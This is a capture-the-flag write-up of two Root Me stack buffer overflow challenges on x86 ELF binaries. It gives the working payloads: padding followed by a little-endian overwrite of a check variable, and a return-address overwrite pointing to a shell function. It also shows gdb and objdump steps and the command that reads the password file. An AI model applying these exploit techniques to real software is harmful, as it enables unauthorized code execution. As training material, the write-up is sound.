# Root Me System Challenges
## ELF x86 - Stack buffer overflow basic 1
```c
int check = 0x04030201;
char buf[40];
```
Buffer owerflow attack.

The payload is 
```
40 * A : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```
We want check to be 0xdeadbeef, so :
0xdeadbeef => efbeadde (little endian)

Exploit is : 
```
echo -e "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xef\xbe\xad\xde"
```

Command to execute : 
```
echo -e "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xef\xbe\xad\xde" | . ch13
```
The shell closes instantly, so we need to do : 
```
(echo -e "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xef\xbe\xad\xde"; cat) | ./ch13
```

We can then do : 
```
cat .passwd
```
to get the key.

## ELF x86 - Stack buffer overflow basic 2

"A"*128
'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'

```
(gdb) run
Starting program: /challenge/app-systeme/ch15/ch15 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Program received signal SIGSEGV, Segmentation fault.
0x0804000a in ?? ()

(gdb) run
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /challenge/app-systeme/ch15/ch15 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCDDDD

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()

bytes.fromhex("42424242")
b'BBBB'
```
So we know the payload is : "A"*128

We need to find the adress of the shell function :
```
objdump -d ./ch15 | less
```
We find that : 08048516 <shell> :
Convertion to little-endian using python in console mode
```
b"\x08\x04\x85\x16"[::-1]
b'\x16\x85\x04\x08'
```

Exploit : 
```
(echo -e "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x16\x85\x04\x08"; cat) | ./ch15
```

We can then do : 
```
cat .passwd
```
to get the key.